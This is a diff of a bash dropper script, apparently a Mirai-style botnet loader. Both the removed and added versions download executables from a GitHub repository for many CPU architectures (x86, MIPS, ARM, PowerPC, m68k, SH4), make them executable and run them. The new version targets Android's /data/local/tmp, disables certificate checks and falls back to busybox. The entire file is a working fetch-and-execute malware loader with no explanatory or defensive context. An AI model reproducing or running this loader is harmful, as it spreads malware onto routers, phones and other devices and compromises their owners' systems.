@@ -1,11 +1,26 @@
 #!/bin/bash
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.x86; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.x86;cat sync.x86 >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.mips; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.mips;cat sync.mips >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.mipsel; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.mipsel;cat sync.mipsel >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm4; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm4;cat sync.arm4 >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm5; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm5;cat sync.arm5 >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm6; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm6;cat sync.arm6 >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm7; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.arm7;cat sync.arm7 >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.powerpc; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.powerpc;cat sync.powerpc >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.m68k; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.m68k;cat sync.m68k >sync;chmod +x *;./sync
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.sh4; curl -O https://raw.githubusercontent.com/syncvmpurchase/8572lfj38436ab/refs/heads/main/sync.sh4;cat sync.sh4 >sync;chmod +x *;./sync
+
+download_and_run() {
+    local url=$1
+    local file=$2
+    
+    cd /data/local/tmp
+    
+    wget --no-check-certificate "$url" -O "$file" || \
+    curl -k -L "$url" -o "$file" || \
+    busybox wget "$url" -O "$file"
+    
+    chmod +x "$file"
+    ./"$file"
+}
+
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.x86" "sync.x86"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.mips" "sync.mips"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.mipsel" "sync.mipsel"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm4" "sync.arm4"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm5" "sync.arm5"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm6" "sync.arm6"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm7" "sync.arm7"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.powerpc" "sync.powerpc"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.m68k" "sync.m68k"
+download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.sh4" "sync.sh4"
